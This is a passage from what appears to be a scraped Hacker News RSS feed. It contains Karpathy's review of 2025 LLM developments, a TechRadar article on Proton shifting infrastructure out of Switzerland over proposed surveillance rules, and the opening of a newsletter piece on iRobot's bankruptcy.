<p>2025 has been a strong and eventful year of progress in LLMs. The following is a list of personally notable and mildly surprising "paradigm changes" - things that altered the landscape and stood out to me conceptually.</p>
<h3 id="1-reinforcement-learning-from-verifiable-rewards-rlvr">1. Reinforcement Learning from Verifiable Rewards (RLVR)</h3><p>At the start of 2025, the LLM production stack in all labs looked something like this:</p>
<ol>
<li>Pretraining (GPT-2/3 of ~2020)</li>
<li>Supervised Finetuning (InstructGPT ~2022) and</li>
<li>Reinforcement Learning from Human Feedback (RLHF ~2022)</li>
</ol>
<p>This was the stable and proven recipe for training a production-grade LLM for a while. In 2025, Reinforcement Learning from Verifiable Rewards (RLVR) emerged as the de facto new major stage to add to this mix. By training LLMs against automatically verifiable rewards across a number of environments (e.g. think math/code puzzles), the LLMs spontaneously develop strategies that look like "reasoning" to humans - they learn to break down problem solving into intermediate calculations and they learn a number of problem solving strategies for going back and forth to figure things out (see DeepSeek R1 paper for examples). These strategies would have been very difficult to achieve in the previous paradigms because it's not clear what the optimal reasoning traces and recoveries look like for the LLM - it has to find what works for it, via the optimization against rewards.</p>
<p>Unlike the SFT and RLHF stage, which are both relatively thin/short stages (minor finetunes computationally), RLVR involves training against objective (non-gameable) reward functions which allows for a lot longer optimization. Running RLVR turned out to offer high capability/$, which gobbled up the compute that was originally intended for pretraining. Therefore, most of the capability progress of 2025 was defined by the LLM labs chewing through the overhang of this new stage and overall we saw ~similar sized LLMs but a lot longer RL runs. Also unique to this new stage, we got a whole new knob (and and associated scaling law) to control capability as a function of test time compute by generating longer reasoning traces and increasing "thinking time". OpenAI o1 (late 2024) was the very first demonstration of an RLVR model, but the o3 release (early 2025) was the obvious point of inflection where you could intuitively feel the difference.</p>
<h3 id="2-ghosts-vs-animals-jagged-intelligence">2. Ghosts vs. Animals / Jagged Intelligence</h3><p>2025 is where I (and I think the rest of the industry also) first started to internalize the "shape" of LLM intelligence in a more intuitive sense. We're not "evolving/growing animals", we are "summoning ghosts". Everything about the LLM stack is different (neural architecture, training data, training algorithms, and especially optimization pressure) so it should be no surprise that we are getting very different entities in the intelligence space, which are inappropriate to think about through an animal lens. Supervision bits-wise, human neural nets are optimized for survival of a tribe in the jungle but LLM neural nets are optimized for imitating humanity's text, collecting rewards in math puzzles, and getting that upvote from a human on the LM Arena. As verifiable domains allow for RLVR, LLMs "spike" in capability in the vicinity of these domains and overall display amusingly jagged performance characteristics - they are at the same time a genius polymath and a confused and cognitively challenged grade schooler, seconds away from getting tricked by a jailbreak to exfiltrate your data.</p>
<p><img src="https://bear-images.sfo2.cdn.digitaloceanspaces.com/karpathy/g6zymj4a0amnjkj.webp" alt="G6zymj4a0AMNJkJ">(human intelligence: blue, AI intelligence: red. I like this version of the meme (I'm sorry I lost the reference to its original post on X) for pointing out that human intelligence is also jagged in its own different way.)</p>
<p>Related to all this is my general apathy and loss of trust in benchmarks in 2025. The core issue is that benchmarks are almost by construction verifiable environments and are therefore immediately susceptible to RLVR and weaker forms of it via synthetic data generation. In the typical benchmaxxing process, teams in LLM labs inevitably construct environments adjacent to little pockets of the embedding space occupied by benchmarks and grow jaggies to cover them. Training on the test set is a new art form.</p>
<p>What does it look like to crush all the benchmarks but still not get AGI?</p>
<p>I have written a lot more on the topic of this section here:</p>
<ul>
<li><a href="https://karpathy.bearblog.dev/animals-vs-ghosts/">Animals vs. Ghosts</a></li>
<li><a href="https://karpathy.bearblog.dev/verifiability/">Verifiability</a></li>
<li><a href="https://karpathy.bearblog.dev/the-space-of-minds">The Space of Minds</a></li>
</ul>
<h3 id="3-cursor-new-layer-of-llm-apps">3. Cursor / new layer of LLM apps</h3><p>What I find most notable about Cursor (other than its meteoric rise this year) is that it convincingly revealed a new layer of an "LLM app" - people started to talk about "Cursor for X". As I highlighted in my Y Combinator talk this year (<a href="https://www.donnamagi.com/articles/karpathy-yc-talk">transcript</a> and <a href="https://www.youtube.com/watch?v=LCEmiRjPEtQ">video</a>), LLM apps like Cursor bundle and orchestrate LLM calls for specific verticals:</p>
<ol>
<li>They do the "context engineering"</li>
<li>They orchestrate multiple LLM calls under the hood strung into increasingly more complex DAGs, carefully balancing performance and cost tradeoffs.</li>
<li>They provide an application-specific GUI for the human in the loop</li>
<li>They offer an "autonomy slider"</li>
</ol>
<p>A lot of chatter has been spent in 2025 on how "thick" this new app layer is. Will the LLM labs capture all applications or are there green pastures for LLM apps? Personally I suspect that LLM labs will trend to graduate the generally capable college student, but LLM apps will organize, finetune and actually animate teams of them into deployed professionals in specific verticals by supplying private data, sensors and actuators and feedback loops.</p>
<h3 id="4-claude-code-ai-that-lives-on-your-computer">4. Claude Code / AI that lives on your computer</h3><p>Claude Code (CC) emerged as the first convincing demonstration of what an LLM Agent looks like - something that in a loopy way strings together tool use and reasoning for extended problem solving. In addition, CC is notable to me in that it runs on your computer and with your private environment, data and context. I think OpenAI got this wrong because they focused their early codex / agent efforts on cloud deployments in containers orchestrated from ChatGPT instead of simply <code>localhost</code>. And while agent swarms running in the cloud feels like the "AGI endgame", we live in an intermediate and slow enough takeoff world of jagged capabilities that it makes more sense to run the agents directly on the developer's computer. Note that the primary distinction that matters is not about where the "AI ops" happen to run (in the cloud, locally or whatever), but about everything else - the already-existing and booted up computer, its installation, context, data, secrets, configuration, and the low-latency interaction. Anthropic got this order of precedence correct and packaged CC into a delightful, minimal CLI form factor that changed what AI looks like - it's not just a website you go to like Google, it's a little spirit/ghost that "lives" on your computer. This is a new, distinct paradigm of interaction with an AI.</p>
<h3 id="5-vibe-coding">5. Vibe coding</h3><p>2025 is the year that AI crossed a capability threshold necessary to build all kinds of impressive programs simply via English, forgetting that the code even exists. Amusingly, I coined the term "vibe coding" in <a href="https://x.com/karpathy/status/1886192184808149383">this shower of thoughts tweet</a> totally oblivious to how far it would go :). With vibe coding, programming is not strictly reserved for highly trained professionals, it is something anyone can do. In this capacity, it is yet another example of what I wrote about in <a href="https://karpathy.bearblog.dev/power-to-the-people/">Power to the people: How LLMs flip the script on technology diffusion</a>, on how (in sharp contrast to all other technology so far) regular people benefit a lot more from LLMs compared to professionals, corporations and governments. But not only does vibe coding empower regular people to approach programming, it empowers trained professionals to write a lot more (vibe coded) software that would otherwise never be written. In nanochat, I vibe coded my own custom highly efficient BPE tokenizer in Rust instead of having to adopt existing libraries or learn Rust at that level. I vibe coded many projects this year as quick app demos of something I wanted to exist (e.g. see <a href="https://karpathy.bearblog.dev/vibe-coding-menugen">menugen</a>, <a href="https://github.com/karpathy/llm-council">llm-council</a>, <a href="https://github.com/karpathy/reader3">reader3</a>, <a href="https://github.com/karpathy/hn-time-capsule">HN time capsule</a>). And I've vibe coded entire ephemeral apps just to find a single bug because why not - code is suddenly free, ephemeral, malleable, discardable after single use. Vibe coding will terraform software and alter job descriptions.</p>
<h3 id="6-nano-banana-llm-gui">6. Nano banana / LLM GUI</h3><p>Google Gemini Nano banana is one of the most incredible, paradigm-shifting models of 2025. In my world view, LLMs are the next major computing paradigm similar to computers of the 1970s, 80s, etc. Therefore, we are going to see similar kinds of innovations for fundamentally similar kinds of reasons. We're going to see equivalents of personal computing, of microcontrollers (cognitive core), or internet (of agents), etc etc. In particular, in terms of the UIUX, "chatting" with LLMs is a bit like issuing commands to a computer console in the 1980s. Text is the raw/favored data representation for computers (and LLMs), but it is not the favored format for people, especially at the input. People actually dislike reading text - it is slow and effortful. Instead, people love to consume information visually and spatially and this is why the GUI has been invented in traditional computing. In the same way, LLMs should speak to us in our favored format - in images, infographics, slides, whiteboards, animations/videos, web apps, etc. The early and present version of this of course are things like emoji and Markdown, which are ways to "dress up" and lay out text visually for easier consumption with titles, bold, italics, lists, tables, etc. But who is actually going to build the LLM GUI? In this world view, nano banana is a first early hint of what that might look like. And importantly, one notable aspect of it is that it's not just about the image generation itself, it's about the joint capability coming from text generation, image generation and world knowledge, all tangled up in the model weights.</p>
<hr>
<p><strong>TLDR</strong>. 2025 was an exciting and mildly surprising year of LLMs. LLMs are emerging as a new kind of intelligence, simultaneously a lot smarter than I expected and a lot dumber than I expected. In any case they are extremely useful and I don't think the industry has realized anywhere near 10% of their potential even at present capability. Meanwhile, there are so many ideas to try and conceptually the field feels wide open. And as I mentioned on my <a href="https://www.dwarkesh.com/p/andrej-karpathy">Dwarkesh pod</a> earlier this year, I simultaneously (and on the surface paradoxically) believe that we will both see rapid and continued progress <em>and</em> that yet there is a lot of work to be done. Strap in.</p>


    

    
        

        
            


        

        
            
        
    


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You can now play Grand Theft Auto Vice City in the browser (319 pts)]]></title>
            <link>https://dos.zone/grand-theft-auto-vice-city/</link>
            <guid>46329696</guid>
            <pubDate>Fri, 19 Dec 2025 19:12:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dos.zone/grand-theft-auto-vice-city/">https://dos.zone/grand-theft-auto-vice-city/</a>, See on <a href="https://news.ycombinator.com/item?id=46329696">Hacker News</a></p>
Couldn't get https://dos.zone/grand-theft-auto-vice-city/: Error: getaddrinfo ENOTFOUND dos.zone]]></description>
        </item>
        <item>
            <title><![CDATA[Is Proton leaving Switzerland? (141 pts)]]></title>
            <link>https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes</link>
            <guid>46329654</guid>
            <pubDate>Fri, 19 Dec 2025 19:08:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes">https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes</a>, See on <a href="https://news.ycombinator.com/item?id=46329654">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">
<section>
<div>
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1920-80.jpg.webp 1920w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" alt="Proton CEO and founder Andy Yen poses next to the Proton logo at the headquarters of the encrypted email and VPN services company in Geneva." srcset="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1920-80.jpg 1920w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-320-80.jpg 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<figcaption>
<span>(Image credit: Photo by FABRICE COFFRINI/AFP via Getty Images)</span>
</figcaption>
</div>
<div id="article-body">

<hr id="5a74e302-1393-4a6d-b1ef-63bbfc478321"><ul id="3fa5f55a-4719-407b-9f71-43e7f00691dc"><li><strong>Proton said the company has begun moving some of its physical infrastructure out of Switzerland for fear of the new proposed surveillance law</strong></li><li><strong>Lumo, the company's newly launched privacy-first AI chatbot, is the first product to move</strong></li><li><strong>An amendment to the current surveillance law would require VPNs and messaging apps to identify and retain user data</strong></li></ul><hr id="07aab82f-233e-4ba0-a7b3-cd740ce253ea"><p id="635fc126-2793-403b-8e3c-6df60d61901e">Proton has confirmed the company has begun moving out of Switzerland due to "legal uncertainty" over the newly proposed surveillance law.</p><p>Proton's newly launched privacy-first AI chatbot, Lumo, has become the first product to change home yet, "investing in Europe does not equate to leaving Switzerland," a company spokesperson told TechRadar, amid rumors it's exiting the country for good.</p><p id="635fc126-2793-403b-8e3c-6df60d61901e-2">The firm behind one of the <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/best-vpn" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/best-vpn">best VPN</a> and encrypted email services has been very critical of the Swiss government’s proposed <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/secure-encryption-and-online-anonymity-are-now-at-risk-in-switzerland-heres-what-you-need-to-know" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/secure-encryption-and-online-anonymity-are-now-at-risk-in-switzerland-heres-what-you-need-to-know">amendment of its surveillance law</a> since the beginning, already sharing plans to <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/we-would-be-less-confidential-than-google-proton-threatens-to-quit-switzerland-over-new-surveillance-law" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/we-would-be-less-confidential-than-google-proton-threatens-to-quit-switzerland-over-new-surveillance-law">quit Switzerland</a> back in May.</p><p>If it passes, the Ordinance on the Surveillance of Correspondence by Post and Telecommunications (OSCPT) will introduce new obligations for <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/virtual-private-networks" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/virtual-private-networks">virtual private networks (VPNs)</a>, messaging apps, and social networks. These measures include mandatory user identification and data retention of up to six months for all services with at least 5,000 users. Providers will also be required to decrypt the communication upon the authorities' request should they own encryption keys.</p><h2 id="lumo-the-first-to-go-3">Lumo – the first to go</h2><figure data-bordeaux-image-check="" id="9bcbe264-296c-45d1-9c4d-87ea4e432485"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg" alt="Lumo AI from Proton." srcset="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-320-80.jpg 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg">
</picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Proton)</span></figcaption></figure><p id="4881be25-a1ed-46ea-9b2d-592e429f356c">Proton launched its <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/artificial-intelligence/look-out-chatgpt-the-creator-of-proton-mail-has-just-launched-a-new-ai-chatbot-thats-super-secure-and-private" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/artificial-intelligence/look-out-chatgpt-the-creator-of-proton-mail-has-just-launched-a-new-ai-chatbot-thats-super-secure-and-private">ChatGPT competitor, Lumo</a>, in July 2025, to give its users an alternative to Big Tech solutions that truly protect their privacy.</p><p>In a <a data-analytics-id="inline-link" href="https://go.getproton.me/aff_c?offer_id=26&amp;aff_id=1046&amp;source=trd&amp;aff_click_id=trd-us-1618065571907932815&amp;url=https%3A%2F%2Fproton.me%2Fblog%2Flumo-ai%3FvisitorId%3Dho-%7Btransaction_id%7D%26aid%3D%7Baffiliate_id%7D%26offer_id%3D%7Boffer_id%7D%26utm_campaign%3Dww-all-2a-mail-gro_aff-tune%26utm_medium%3Dlink%26utm_source%3Daid-tune-%7Baffiliate_id%7D%26utm_content%3D%7Boffer_id%7D%26offer%3Dplus-professional-visionary%26url_id%3D%7Boffer_url_id%7D&amp;aff_sub2=https%3A%2F%2Fwww.techradar.com%2Fvpn%2Fvpn-privacy-security%2Fis-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes" target="_blank" data-url="https://proton.me/blog/lumo-ai" referrerpolicy="no-referrer-when-downgrade" rel="sponsored noopener" data-hl-processed="hawklinks" data-google-interstitial="false" data-placeholder-url="https://go.getproton.me/aff_c?offer_id=26&amp;aff_id=1046&amp;source=trd&amp;aff_click_id=hawk-custom-tracking&amp;url=https%3A%2F%2Fproton.me%2Fblog%2Flumo-ai%3FvisitorId%3Dho-%7Btransaction_id%7D%26aid%3D%7Baffiliate_id%7D%26offer_id%3D%7Boffer_id%7D%26utm_campaign%3Dww-all-2a-mail-gro_aff-tune%26utm_medium%3Dlink%26utm_source%3Daid-tune-%7Baffiliate_id%7D%26utm_content%3D%7Boffer_id%7D%26offer%3Dplus-professional-visionary%26url_id%3D%7Boffer_url_id%7D&amp;aff_sub2=hawk-article-url" data-merchant-name="Proton VPN" data-merchant-id="208918" data-merchant-network="HasOffersProtonMail" data-merchant-url="proton.me" data-mrf-recirculation="inline-link">blog post</a> about the launch, Proton's Head of Anti-Abuse and Account Security, Eamonn Maguire, explains that the company has decided to invest outside Switzerland for fear of the looming legal changes.</p><p>He wrote: "Because of legal uncertainty around Swiss government proposals to introduce mass surveillance – proposals that have been outlawed in the EU – Proton is moving most of its physical infrastructure out of Switzerland. Lumo will be the first product to move."</p><p><a data-analytics-id="inline-link" href="https://www.swissinfo.ch/eng/ai-governance/proton-does-not-trust-switzerland-to-host-its-ai-servers/89727842" target="_blank" data-url="https://www.swissinfo.ch/eng/ai-governance/proton-does-not-trust-switzerland-to-host-its-ai-servers/89727842" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link">Talking to a Swiss publication</a> after the launch, Proton's CEO Andy Yen confirmed that the proposed changes to the Swiss surveillance law made the company opt for Germany instead to host Lumo's servers. Proton has also confirmed it's also developing facilities in Norway.</p><p>While the company did not specify that Germany would become the new home of the majority of its infrastructure, Proton confirmed to TechRadar that investing in Europe doesn't equate to leaving Switzerland.</p><p>It's worth noting, however, that being based in the EU could make Proton, and similar companies, vulnerable to wider data retention or scanning obligations if proposals like the so-called<a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/chat-control-2-0-experts-urge-the-eu-not-to-undermine-encryption-with-new-protecteu-plan" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/chat-control-2-0-experts-urge-the-eu-not-to-undermine-encryption-with-new-protecteu-plan"> </a><a data-analytics-id="inline-link" href="https://www.techradar.com/pro/security/the-european-commission-wants-a-backdoor-for-end-to-end-encryptions-for-law-enforcement" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/pro/security/the-european-commission-wants-a-backdoor-for-end-to-end-encryptions-for-law-enforcement">ProtectEU</a> or <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/a-political-blackmail-the-eu-parliament-is-pressing-for-new-mandatory-scanning-of-your-private-chats" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/a-political-blackmail-the-eu-parliament-is-pressing-for-new-mandatory-scanning-of-your-private-chats">Chat Control were to pass</a>.</p><p>We approached Proton for clarification on this point, and a company spokesperson pointed out that mandatory data retention has already been ruled illegal multiple times by European courts.</p><p>"However, we will, of course, continue to monitor developments in the EU closely, as we do elsewhere," Proton added.</p><h2 id="what-s-next-for-the-swiss-tech-privacy-industry-3">What's next for the Swiss tech privacy industry?</h2><p id="6d48e50d-a2d3-45e1-9764-0596fbcc65f2">Proton isn't the only provider that has been vocal against what critics have deemed Switzerland's "<a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/a-war-against-online-anonymity-why-switzerland-wants-to-change-its-surveillance-law-and-whats-at-stake" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/a-war-against-online-anonymity-why-switzerland-wants-to-change-its-surveillance-law-and-whats-at-stake">war against online anonymity</a>."</p><p>Another VPN provider, <a data-analytics-id="inline-link" href="https://www.techradar.com/pro/vpn/nymvpn" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/pro/vpn/nymvpn">NymVPN</a>, confirmed back in May its intentions to leave Switzerland if the new surveillance rules are enforced.</p><p>Talking to TechRadar, Nym's co-founder and COO, Alexis Roussel, shares support for Proton's decision to find a new home for its private AI chatbot.</p><p>He said, "Proton is in a position that they are expanding, so it totally makes sense. You cannot invest in privacy in Switzerland right now."</p><p>Roussel also confirmed to TechRadar that the company has already developed a strategy to move its VPN activities outside Switzerland and the EU. Yet, this remains the last resort.</p><p>He also explains that the fact that Nym works on a decentralised infrastructure means that it won't be affected by the encryption provision, as the company doesn't hold any encryption keys.</p><p>"Depending on how they modify things within the law, this will affect our decision to move. But we would like to resist the ordinance until the end and go to the tribunal," said Roussel.</p><p>As <a data-analytics-id="inline-link" href="https://cyberinsider.com/decentralizing-trust-an-interview-with-the-team-behind-session-messenger/" target="_blank" data-url="https://cyberinsider.com/decentralizing-trust-an-interview-with-the-team-behind-session-messenger/" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link">reported by Cyberinsider</a>, also secure and private messaging app <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/undermining-your-privacy-session-says-no-and-leaves-australia" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/undermining-your-privacy-session-says-no-and-leaves-australia">Session</a> said that, "while keeping a close eye on the situation," its decentralized structure means its services are less vulnerable to the changes.</p><h3 id="section-you-might-also-like"><span>You might also like</span></h3><ul id="f7bd908f-714f-4fa5-aa50-378f07a3d426"><li><a href="https://www.techradar.com/vpn/vpn-services/once-you-have-the-data-you-have-to-cooperate-windscribe-ceo-speak-out-against-global-threats-to-no-log-vpns" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-services/once-you-have-the-data-you-have-to-cooperate-windscribe-ceo-speak-out-against-global-threats-to-no-log-vpns">Windscribe CEO speaks out against global threats to no-log VPNs</a></li><li><a href="https://www.techradar.com/vpn/vpn-privacy-security/encryption-backdoors-privacy-can-be-misused-but-the-cost-of-a-world-without-is-so-much-higher" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/encryption-backdoors-privacy-can-be-misused-but-the-cost-of-a-world-without-is-so-much-higher">Encryption backdoors: privacy can be misused, "but the cost of a world without is so much higher"</a></li><li><a href="https://www.techradar.com/vpn/vpn-privacy-security/a-win-for-privacy-florida-rejects-the-encryption-backdoor-law-for-social-media" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/a-win-for-privacy-florida-rejects-the-encryption-backdoor-law-for-social-media">"A win for privacy" – Florida rejects the encryption backdoor law for social media</a></li></ul>
</div>


<div id="slice-container-authorBio-cwLKnJMyRrfSySyTLYiwnb"><p>Chiara is a multimedia journalist committed to covering stories to help promote the rights and denounce the abuses of the digital side of life – wherever cybersecurity, markets, and politics tangle up. She believes an open, uncensored, and private internet is a basic human need and wants to use her knowledge of VPNs to help readers take back control. She writes news, interviews, and analysis on data privacy, online censorship, digital rights, tech policies, and security software, with a special focus on VPNs, for TechRadar and TechRadar Pro. Got a story, tip-off, or something tech-interesting to say? Reach out to chiara.castro@futurenet.com</p></div>
</section>

<div x-show="$store.Viafoura.showWidgets" x-cloak="" data-component-name="Viafoura:Comments" x-data="ViafouraComments('300px')" data-nosnippet="" data-community-guidelines-text="<p class='vfcustom-community-guidelines'>Please follow our <a href=&quot;https://www.techradar.com/news/about-us#section-community-guidelines&quot; target=&quot;_blank&quot;>community guidelines</a>.</p>">
<p>You must confirm your public display name before commenting</p>
<p>Please logout and then login again, you will then be prompted to enter your display name.</p>
</div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wall Street Ruined the Roomba and Then Blamed Lina Khan (232 pts)]]></title>
            <link>https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba</link>
            <guid>46329536</guid>
            <pubDate>Fri, 19 Dec 2025 18:59:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba">https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba</a>, See on <a href="https://news.ycombinator.com/item?id=46329536">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>A few days ago, consumer products company iRobot, the maker of iconic Roomba automated vacuum cleaner, </span><a href="https://www.theatlantic.com/technology/2025/12/roomba-dream-home-robotics/685293/" rel="">declared bankruptcy</a><span>. The CEO, a branding and mergers expert named </span><a href="https://investor.irobot.com/board-member/gary-cohen" rel="">Gary Cohen</a><span>, sadly announced that the firm could not continue as a going concern. </span></p><p>The board, full of lawyers and financiers but not robotics experts, voted to sell iRobot off to Shenzhen Picea Robotics, the Chinese company to which it had offshored manufacturing. There are about 20 million active Roomba vacuum cleaners in operation, and unless Trump regulators or antitrust enforcers act, now all the data harvested from our homes will go to China.</p><p><span>The co-founder of iRobot, Colin Angle, was not introspective about this collapse, nor did he associate it within the broader context of the many firms who have had their technology transferred to China. Instead, he, like much of Wall Street, </span><a href="https://www.foxbusiness.com/economy/irobot-co-founder-says-ftcs-opposition-amazon-deal-wrong-minded-following-bankruptcy-filing" rel="">blamed</a><span> the bankruptcy on Lina Khan. Why? Well she ran the Federal Trade Commission when it investigated Amazon’s possible acquisition of the company in 2022, a deal the two companies ultimately called off. Here’s Angle:</span></p><blockquote><p>“I bet if you asked almost anyone prior to the blocking of the deal with iRobot: Would you rather see iRobot innovating like crazy, coming out with new and better robots for your home, or would you like to see it file for Chapter 11 in the process of being sold to a Chinese manufacturer?” he said. “The wrong thing probably happened.”</p></blockquote><p>Many Wall Street dealmakers and foes of antitrust enforcement echoed this sentiment. For instance, former Obama chief economist Jason Furman, who is now the Aetna Professor of the Practice of Economic Policy at Harvard, used it as an example of the problem with populist economics. Blocking mergers, he believes, leads to destructive outcomes and national security problems.</p><a href="https://x.com/jasonfurman/status/2000680885234925896" target="_blank" rel="noopener noreferrer" data-component-name="Twitter2ToDOM"><div data-attrs="{&quot;url&quot;:&quot;https://x.com/jasonfurman/status/2000680885234925896&quot;,&quot;full_text&quot;:&quot;Regulators in the United States &amp;amp; Europe blocked Amazon's bid to acquire iRobot.\n\niRobot has not filed for bankruptcy and will be acquired by its main creditor, a Chinese company.\n\nThis is not a good outcome from the perspective of consumers, competition or the national interest.&quot;,&quot;username&quot;:&quot;jasonfurman&quot;,&quot;name&quot;:&quot;Jason Furman&quot;,&quot;profile_image_url&quot;:&quot;&quot;,&quot;date&quot;:&quot;2025-12-15T21:34:28.000Z&quot;,&quot;photos&quot;:[],&quot;quoted_tweet&quot;:{},&quot;reply_count&quot;:0,&quot;retweet_count&quot;:36,&quot;like_count&quot;:347,&quot;impression_count&quot;:0,&quot;expanded_url&quot;:null,&quot;video_url&quot;:null,&quot;belowTheFold&quot;:false}"><div><div title="User"><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 40w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_80,h_80,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 80w, 